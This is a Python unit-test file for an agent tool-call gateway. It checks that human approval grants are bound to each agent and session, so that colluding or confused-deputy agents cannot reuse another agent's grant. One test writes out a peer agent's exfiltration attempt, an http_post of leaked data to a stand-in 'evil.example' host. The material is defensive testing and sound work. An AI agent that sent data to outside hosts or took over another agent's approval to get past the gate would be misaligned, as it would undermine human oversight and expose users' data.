"""Kintsugi Pass 5 — multi-agent collusion tests (additive).

Encodes session isolation, agent-bound fingerprints, grant binding,
token handoff refusal, confused-deputy non-transfer, require_agent_id.

Uses SoftApe (always allow) so Phoenix escalates publish → phoenix-local
tokens (appr_phoenix_*), matching Pass 3 fingerprint tests. One case also
covers live mock APE grant isolation via agent-bound fingerprint.
"""

from __future__ import annotations

import os
import sys
import tempfile
import unittest
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[1]
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

from phoenix_gate.ape_client import ApeClient, VerifyResult
from phoenix_gate.phoenix_locks import reset_policy_env_seal
from phoenix_gate.gateway import (
    GrantMismatchError,
    approve_gate_token,
    assert_grant_matches,
    call_fingerprint,
    gate_tool_call,
    peek_pending_approval,
    require_agent_id_enabled,
    reset_local_approvals,
)
from phoenix_gate.mock_ape_server import start_background


class SoftApe:
    """APE that soft-allows everything — Phoenix escalate ask_human locks."""

    def verify(self, tool_name, args, session_id=None, agent_id=None):
        return VerifyResult(
            allowed=True,
            reason="soft allow",
            intent="unknown",
            decision_id="soft-d",
            decision="allow",
            grant_consumed=False,
        )


class MultiAgentCollusionTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.httpd = start_background(host="127.0.0.1", port=0)
        host, port = cls.httpd.server_address[:2]
        cls.ape_url = f"http://{host}:{port}"
        cls.client = ApeClient(base_url=cls.ape_url, timeout=2.0)

    @classmethod
    def tearDownClass(cls) -> None:
        cls.httpd.shutdown()

    def setUp(self) -> None:
        reset_local_approvals()
        reset_policy_env_seal()
        os.environ.pop("PHOENIX_GATE_REQUIRE_AGENT_ID", None)

    def tearDown(self) -> None:
        os.environ.pop("PHOENIX_GATE_REQUIRE_AGENT_ID", None)
        reset_local_approvals()
        reset_policy_env_seal()

    def _gate(self, tool, args, *, session_id, agent_id, receipts, client=None):
        return gate_tool_call(
            tool,
            args,
            session_id=session_id,
            agent_id=agent_id,
            client=client if client is not None else SoftApe(),  # type: ignore[arg-type]
            receipts_path=receipts,
        )

    def test_fingerprint_includes_agent(self) -> None:
        args = {"text": "x"}
        fp_a = call_fingerprint("publish", args, "s1", "agent-A")
        fp_b = call_fingerprint("publish", args, "s1", "agent-B")
        fp_none = call_fingerprint("publish", args, "s1", None)
        self.assertNotEqual(fp_a, fp_b)
        self.assertNotEqual(fp_a, fp_none)
        self.assertTrue(fp_a.startswith("fp:"))

    def test_shared_session_b_cannot_steal_a_grant(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            receipts = Path(tmp) / "c.jsonl"
            args = {"text": "hi"}
            a = self._gate(
                "publish", args, session_id="shared", agent_id="A", receipts=receipts
            )
            self.assertEqual(a.decision, "require_approval")
            self.assertTrue((a.approval_token or "").startswith("appr_phoenix_"))
            granted = approve_gate_token(
                a.approval_token or "",
                approver="Founder",
                expected_session_id="shared",
                expected_agent_id="A",
                expected_args=args,
            )
            self.assertTrue(granted.granted, granted.reason)
            b = self._gate(
                "publish", args, session_id="shared", agent_id="B", receipts=receipts
            )
            self.assertNotEqual(b.decision, "allow")
            self.assertEqual(b.decision, "require_approval")
            a2 = self._gate(
                "publish", args, session_id="shared", agent_id="A", receipts=receipts
            )
            self.assertTrue(a2.allowed)
            self.assertTrue(a2.extras.get("grant_consumed"))

    def test_approve_rejects_wrong_expected_agent(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            receipts = Path(tmp) / "c.jsonl"
            args = {"text": "handoff"}
            a = self._gate(
                "publish", args, session_id="s", agent_id="A", receipts=receipts
            )
            self.assertTrue((a.approval_token or "").startswith("appr_phoenix_"))
            bad = approve_gate_token(
                a.approval_token or "",
                expected_agent_id="B",
                expected_session_id="s",
                expected_args=args,
            )
            self.assertFalse(bad.granted)
            self.assertIn("fingerprint", bad.reason.lower())

    def test_isolated_sessions_no_bleed(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            receipts = Path(tmp) / "c.jsonl"
            args = {"text": "iso"}
            a = self._gate(
                "publish", args, session_id="sess-A", agent_id="A", receipts=receipts
            )
            approve_gate_token(
                a.approval_token or "",
                expected_session_id="sess-A",
                expected_agent_id="A",
            )
            b = self._gate(
                "publish", args, session_id="sess-B", agent_id="B", receipts=receipts
            )
            self.assertNotEqual(b.decision, "allow")

    def test_confused_deputy_planner_grant_not_inherited(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            receipts = Path(tmp) / "c.jsonl"
            evil = {"text": "evil_payload"}
            planner = self._gate(
                "publish",
                evil,
                session_id="crew",
                agent_id="evil-planner",
                receipts=receipts,
            )
            approve_gate_token(
                planner.approval_token or "",
                expected_agent_id="evil-planner",
                expected_session_id="crew",
                expected_args=evil,
            )
            worker = self._gate(
                "publish",
                evil,
                session_id="crew",
                agent_id="benign-worker",
                receipts=receipts,
            )
            self.assertEqual(worker.decision, "require_approval")
            self.assertFalse(worker.allowed)

    def test_peer_exfil_not_allowed_after_peer_read(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            receipts = Path(tmp) / "c.jsonl"
            # read uses real mock (SoftApe would also allow)
            read_a = self._gate(
                "read_file",
                {"path": "/tmp/x"},
                session_id="crew",
                agent_id="A",
                receipts=receipts,
                client=self.client,
            )
            self.assertTrue(read_a.allowed)
            exfil = self._gate(
                "http_post",
                {"url": "https://evil.example/x", "body": "leak"},
                session_id="crew",
                agent_id="B",
                receipts=receipts,
                client=self.client,
            )
            self.assertNotEqual(exfil.decision, "allow")

    def test_require_agent_id_env(self) -> None:
        os.environ["PHOENIX_GATE_REQUIRE_AGENT_ID"] = "1"
        self.assertTrue(require_agent_id_enabled())
        with tempfile.TemporaryDirectory() as tmp:
            receipts = Path(tmp) / "c.jsonl"
            r = self._gate(
                "publish",
                {"text": "x"},
                session_id="s",
                agent_id=None,
                receipts=receipts,
            )
            self.assertEqual(r.decision, "deny")
            self.assertIn("agent_id", r.reason.lower())

    def test_pending_stores_agent_id(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            receipts = Path(tmp) / "c.jsonl"
            a = self._gate(
                "publish",
                {"text": "p"},
                session_id="s",
                agent_id="worker-7",
                receipts=receipts,
            )
            self.assertTrue((a.approval_token or "").startswith("appr_phoenix_"))
            pending = peek_pending_approval(a.approval_token or "")
            self.assertIsNotNone(pending)
            assert pending is not None
            self.assertEqual(pending.get("agent_id"), "worker-7")
            self.assertEqual(
                pending.get("fingerprint"),
                call_fingerprint("publish", {"text": "p"}, "s", "worker-7"),
            )

    def test_assert_grant_matches_rejects_cross_agent(self) -> None:
        args = {"text": "t"}
        fp = call_fingerprint("publish", args, "s", "A")
        grant = {
            "fingerprint": fp,
            "tool_name": "publish",
            "args": dict(args),
            "session_id": "s",
            "agent_id": "A",
        }
        assert_grant_matches("publish", args, "s", grant, agent_id="A")
        with self.assertRaises(GrantMismatchError):
            assert_grant_matches("publish", args, "s", grant, agent_id="B")

    def test_mock_ape_grant_also_agent_bound(self) -> None:
        """Live mock APE path: approve then peer with different agent_id cannot consume."""
        with tempfile.TemporaryDirectory() as tmp:
            receipts = Path(tmp) / "c.jsonl"
            args = {"text": "ape-path"}
            a = gate_tool_call(
                "publish",
                args,
                session_id="shared",
                agent_id="A",
                client=self.client,
                receipts_path=receipts,
            )
            self.assertEqual(a.decision, "require_approval")
            tok = a.approval_token
            self.assertTrue(tok)
            # APE-issued token (not phoenix-local)
            self.assertFalse((tok or "").startswith("appr_phoenix_"))
            appr = self.client.approve(tok or "", approver="Founder")
            self.assertTrue(appr.granted, appr.reason)
            b = gate_tool_call(
                "publish",
                args,
                session_id="shared",
                agent_id="B",
                client=self.client,
                receipts_path=receipts,
            )
            self.assertNotEqual(b.decision, "allow")
            a2 = gate_tool_call(
                "publish",
                args,
                session_id="shared",
                agent_id="A",
                client=self.client,
                receipts_path=receipts,
            )
            self.assertTrue(a2.allowed)
            self.assertTrue(a2.extras.get("grant_consumed"))


if __name__ == "__main__":
    unittest.main()
